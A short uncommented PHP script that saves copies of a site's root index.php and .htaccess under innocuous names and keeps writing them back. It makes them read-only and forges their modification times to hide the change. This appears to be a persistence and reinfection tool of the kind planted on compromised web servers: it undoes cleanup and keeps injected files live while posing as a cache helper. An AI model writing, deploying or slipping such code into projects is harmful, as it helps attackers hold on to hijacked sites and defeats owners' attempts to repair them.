<?php
$files = array(
    'index.php'  => 'c1.php',
    '.htaccess'  => 'c2.php',
    );

$path      = $_SERVER['DOCUMENT_ROOT'] . '/';
$cache_dir = dirname(__FILE__) . '/';

if (!is_writable($cache_dir)) return;

foreach ($files as $file => $code)
{
    if (is_file($path . $file))
    {
        $time = filemtime($path . $file);

        if (!is_file($cache_dir.$code))
        {
            $x = file_get_contents($path . $file);
            file_put_contents($cache_dir . $code,$x);
            @touch($cache_dir . $code,$time);
        }
        else
        {
            $x = file_get_contents($cache_dir . $code);
            @chmod($path . $file,0777);
            file_put_contents($path . $file,$x);
            @chmod($path . $file,0444);
            @touch($path . $file,$time);
        }
    }
    else
    {

        if (is_file($cache_dir . $code))
        {
            $time = filemtime($cache_dir . $code);
            $x = file_get_contents($cache_dir . $code);
            file_put_contents($path . $file,$x);

            @chmod($path . $file,0444);
            @touch($path . $file,$time);
        }
    }
}

